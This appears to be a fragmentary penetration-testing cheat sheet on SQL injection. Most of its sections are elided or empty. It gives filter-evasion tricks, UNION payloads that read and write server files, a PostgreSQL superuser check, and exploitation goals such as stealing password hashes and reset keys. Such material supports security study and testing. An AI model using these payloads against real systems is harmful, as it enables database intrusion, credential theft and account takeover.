...
#### 15.1.2.2	ENUMERATE NUMBER OF COLUMNS IN CURRENT SELECT STATEMENT
...
#### 15.1.2.3	ENUMERATE VULNERABLE COLUMNS
...
### 15.1.3	FILTER EVASION

#### 15.1.3.1	ABNORMAL CAPITALIZATION

```
UnION, SeLECT
```

#### 15.1.3.2	URL ENCODING
...
#### 15.1.3.3	MULTI-LINE COMMENTS

```
UN/**/ION, SE/**/LECT
```

#### 15.1.3.4	PLUS+ CONCATENATION
...
## 15.2	BOOLEAN-BASED BLIND [6,7]

### 15.2.1	PROOF OF CONCEPT
...
### 15.2.6	AUTOMATED SCRIPT [7]
- See BooleanBlindInjectionScript.txt

## 15.3	TIME-BASED BLIND [8]

### 15.3.1	PROOF OF CONCEPT
...
### 15.4.1	GENERAL CONCEPTS

#### 15.4.1.1	PRIVILEGES AND FUNCTIONS

- FILE privilege allows user to read files [9]
- LOAD_FILE() allows reading files from filesystem [10]

### 15.4.2	READING FILE [11]

```
' UNION SELECT LOAD_FILE('<FILE>'),2,...,N --
```

### 15.4.3	WRITING FILE [11]

```
' UNION SELECT 1,...,N-1, "<FILECONTENTS"> into OUTFILE '<DESTINATIONPATH>' --
```

## 15.5	EXPLOITATION TARGETS

### 15.5.1	STEAL PASSWORD RESET KEY FOR ATO

### 15.5.2	STEAL PASSWORD HASHES

### 15.5.3	WRITE TO FILESYSTEM

## 15.6	DATABASE COLLATION

## 15.7	POSTGRESQL SPECIFIC

### 15.7.1	RUNNING AS SUPERUSER

```
select current_setting('is_superuser');
```

### 15.7.2	FILTER EVASION

#### 15.7.2.1	Use CHR() and ||  concatenation to circumvent single quote sanitization
...
#### 15.7.2.2	Dollar-sign quoted string constants
...
##### 15.7.3.1.1	PAYLOADS [38]

```
/usr/share/sqlmap/data/udf
```

#### 15.7.3.2	COMMANDS [39]
...
## 15.8	MICROSOFT SQL (MSSQL) SPECIFIC

### 15.8.1	ENUMERATION

#### 15.8.1.1	RETURN 1 ROW
...
## 17.3	CONFIRMING EXPLOITABILITY
...
## 17.4	SEARCHING FOR EXPLOITABLE CLASSES
...
# 19	XSL SCRIPT BYPASS

## 19.1	USING MSXSL.EXE
